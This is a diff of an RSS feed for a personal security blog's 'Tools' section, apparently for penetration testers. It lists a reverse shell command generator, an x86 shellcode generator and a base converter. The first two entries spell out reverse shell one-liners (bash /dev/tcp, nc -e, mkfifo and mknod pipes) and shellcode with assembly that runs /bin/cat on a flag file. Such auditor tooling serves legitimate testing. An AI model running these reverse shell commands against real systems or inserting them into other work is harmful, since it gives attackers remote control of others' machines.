@@ -6,18 +6,14 @@
     <description>Recent content in Tools on Master 0xCcC</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <lastBuildDate>Sat, 05 Oct 2019 10:41:06 +0200</lastBuildDate>
-    
-	<atom:link href="https://masterccc.github.io/tools/index.xml" rel="self" type="application/rss+xml" />
-    
-    
+    <lastBuildDate>Sat, 05 Oct 2019 10:41:06 +0200</lastBuildDate><atom:link href="https://masterccc.github.io/tools/index.xml" rel="self" type="application/rss+xml" />
     <item>
       <title>Reverse shell auto-complete</title>
       <link>https://masterccc.github.io/tools/reverseshell/</link>
       <pubDate>Sat, 05 Oct 2019 10:41:06 +0200</pubDate>
       
       <guid>https://masterccc.github.io/tools/reverseshell/</guid>
-      <description>.pre-wrapper{ position:relative; } .pre-wrapper pre{ padding-top: 25px; } .pre-wrapper .copy-snippet { border-radius: 0; min-width:55px; background: none repeat scroll 0 0 transparent; border: 1px solid #bbb; color: #26589F; font-family: &#39;HELEVETICA&#39;,sans-serif; font-size: 12px; font-weight: normal; line-height: 1.42rem; margin: 0; padding: 0px 5px; text-align: center; text-decoration: none; text-indent: 0; position:absolute; background:#ccc; top:0; left:0; } .pre-wrapper .copy-snippet:disabled{ color:#555; } Reverse shell auto-complete Auditor IP : Auditor Port : Generate Bash  bash -i &amp;#x3E;&amp;#x26; /dev/tcp// 0&amp;#x3E;&amp;#x26;1   exec 5&amp;#x3C;&amp;#x3E;/dev/tcp//;cat &amp;#x3C;&amp;#x26;5 | while read line; do $line 2&amp;#x3E;&amp;#x26;5 &amp;#x3E;&amp;#x26;5; done   exec /bin/sh 0&amp;#x3C;/dev/tcp// 1&amp;#x3E;&amp;#x26;0 2&amp;#x3E;&amp;#x26;0  Netcat  nc   -e /bin/bash   /bin/nc.</description>
+      <description>Reverse shell auto-complete Auditor IP : Auditor Port : Generate Bash bash -i &amp;#x3E;&amp;#x26; /dev/tcp// 0&amp;#x3E;&amp;#x26;1 exec 5&amp;#x3C;&amp;#x3E;/dev/tcp//;cat &amp;#x3C;&amp;#x26;5 | while read line; do $line 2&amp;#x3E;&amp;#x26;5 &amp;#x3E;&amp;#x26;5; done exec /bin/sh 0&amp;#x3C;/dev/tcp// 1&amp;#x3E;&amp;#x26;0 2&amp;#x3E;&amp;#x26;0 Netcat nc -e /bin/bash /bin/nc.traditional -e /bin/bash /bin/nc.traditional -c /bin/bash mkfifo rm f;mkfifo f;cat f|/bin/sh -i 2&amp;#x3E;&amp;#x26;1|nc &amp;#x3E; f rm f;mkfifo f;cat f|/bin/sh -i 2&amp;#x3E;&amp;#x26;1|/bin/nc.openbsd &amp;#x3E; f mknod rm -f x; mknod x p &amp;#x26;&amp;#x26; nc 0&amp;#x3C;x | /bin/bash 1&amp;#x3E;x rm -f x; mknod x p &amp;#x26;&amp;#x26; /bin/nc.</description>
     </item>
     
     <item>
@@ -26,7 +22,7 @@
       <pubDate>Thu, 03 Oct 2019 15:41:06 +0200</pubDate>
       
       <guid>https://masterccc.github.io/tools/shellcode_gen/</guid>
-      <description>/bin/cat [your_file] Shellcode generator for intel x86 File name to read : Generate This is your shellcode : \x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80    bits 32 global main SECTION .text main: xor eax,eax ; set eax to 0 push eax ; end of string push 0x7461632f ;&#34;tac/&#34; push 0x6e69622f ;&#34;inb/&#34; mov ebx,esp push eax ; end of string  push 0x7478742e push 0x67616c66   mov ecx,esp push eax ; null push ecx ; file push ebx ; /bin/cat mov ecx,esp ; {/bin/cat,file,null} xor eax,eax add eax,0xb int 0x80   var begin = &#34;</description>
+      <description>/bin/cat [your_file] Shellcode generator for intel x86 File name to read : Generate This is your shellcode : \x31\xc0\x50\x68\x2f\x63\x61\x74\x68\x2f\x62\x69\x6e\x89\xe3\x50\x68\x2e\x74\x78\x74\x68\x66\x6c\x61\x67\x89\xe1\x50\x51\x53\x89\xe1\x31\xc0\x83\xc0\x0b\xcd\x80 bits 32 global main SECTION .text main: xor eax,eax ; set eax to 0 push eax ; end of string push 0x7461632f ;&#34;tac/&#34; push 0x6e69622f ;&#34;inb/&#34; mov ebx,esp push eax ; end of string push 0x7478742e push 0x67616c66 mov ecx,esp push eax ; null push ecx ; file push ebx ; /bin/cat mov ecx,esp ; {/bin/cat,file,null} xor eax,eax add eax,0xb int 0x80 Note for myself : &#34;</description>
     </item>
     
     <item>
@@ -35,7 +31,7 @@
       <pubDate>Sat, 27 Jul 2019 15:41:06 +0200</pubDate>
       
       <guid>https://masterccc.github.io/tools/convert/</guid>
-      <description> Séparateur None Espace Virgule Autre  0x/0b prefix ASCII text  Base64  Base 16  Base 10  Base 2  Length (bytes)    var ld = document ; function _c8(){var e=ld._fm_._rm_.selectedIndex,c=&#34;&#34;;1==e&amp;&amp;(c=&#34; &#34;),2==e&amp;&amp;(c=&#34;,&#34;),3==e&amp;&amp;(c=&#34;,0x&#34;),4==e&amp;&amp;(c=&#34;,0b&#34;),ld._fm_.del.value=c,ld._fm_.del.readOnly=!0,5==e&amp;&amp;(ld._fm_.del.focus(),ld._fm_.del.readOnly=!1),_c0()}function _c9(){ld._fm_._rm_.selectedIndex=5,_c0()}function _cls(){ld._fm_.del.value=&#34;&#34;,ld._fm_._rm_.selectedIndex=0,_c0()}function _x(e,c){var t,n,o,a=hex=dec=bin=&#34;&#34;,l=ld._fm_.del.value,r=&#34;&#34;,d=&#34;&#34;;ld.querySelector(&#34;#prefix&#34;).checked&amp;&amp;(r=&#34;0x&#34;,d=&#34;0b&#34;);for(var m=0;m</description>
+      <description> Separator None Space Comma Other 0x/0b prefix ASCII text Base64 Base 16 Base 10 Base 2 Length (bytes) </description>
     </item>
     
   </channel>
